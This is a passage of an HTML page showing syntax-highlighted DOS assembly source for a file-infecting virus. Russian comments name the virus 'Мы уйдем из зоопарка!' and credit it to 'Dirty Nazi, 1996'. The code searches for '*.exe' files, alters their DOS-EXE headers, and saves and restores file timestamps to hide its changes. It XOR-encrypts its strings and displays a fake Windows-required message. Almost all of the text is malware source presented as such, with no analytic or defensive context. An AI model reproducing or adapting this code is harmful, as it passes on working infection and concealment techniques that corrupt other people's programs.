        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@xor</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seek</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">open</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">savtim</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">96h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ftime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">98h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ftime</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">resttim</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ftime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ftime</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">slovo</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mz</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">; это Дос-EXE header, который мы меняем NE-программам</span><span class="sc0">

</span><span class="sc5">fmask</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'x'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc1">; сие есть шифрованная строка '*.exe',0h - понятно для чего</span><span class="sc0">

</span><span class="sc5">win</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'h'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'i'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'s'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'p'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'r'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'o'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'g'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'r'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'m'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'r'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'q'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'u'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'i'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'r'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'s'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'i'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'r'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'o'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'s'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'o'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'f'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'t'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'W'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'i'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'n'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'d'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'o'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'w'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'s'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
</span><span class="sc5">end_win</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; ну это даже об'яснять не надо :) - это мы ВиНd0Yz хотим</span><span class="sc0">

</span><span class="sc5">author</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'('</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'c'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">')'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'i'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc1">; это строка '(c) DNazi', то бишь указание авторства</span><span class="sc0">

</span><span class="sc5">zoo</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'М'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ы'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'у'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'й'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'д'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'е'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'м'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'и'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'з'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'з'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'о'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'о'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'п'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'а'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'р'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'к'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'а'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'!'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0dbh</span><span class="sc0">
        </span><span class="sc1">; А это собственно ключевая строка в вирусе - его название</span><span class="sc0">
        </span><span class="sc1">; 'Мы уйдем из зоопарка!'</span><span class="sc0">

</span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; выход он и в Африке выход</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_win</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">win</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@xor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0"> </span><span class="sc1">; Выводим просьбу,</span><span class="sc0">
                   </span><span class="sc1">; чтобы нас под виндой другой раз пускали</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c01h</span><span class="sc0">    </span><span class="sc1">; ну и к папе-ДОСу вернемся</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">slovo</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f000h</span><span class="sc0"> </span><span class="sc1">; это просто word для данных</span><span class="sc0">
</span><span class="sc5">ftime</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">slovo</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0"> </span><span class="sc1">; а это для даты/времени</span><span class="sc0">
</span><span class="sc5">virlen</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc1">; сие есть наша длина</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

                                                </span><span class="sc4">(</span><span class="sc10">c</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">Dirty</span><span class="sc0"> </span><span class="sc5">Nazi</span><span class="sc0"> </span><span class="sc2">1996</span></div></body>
</html>
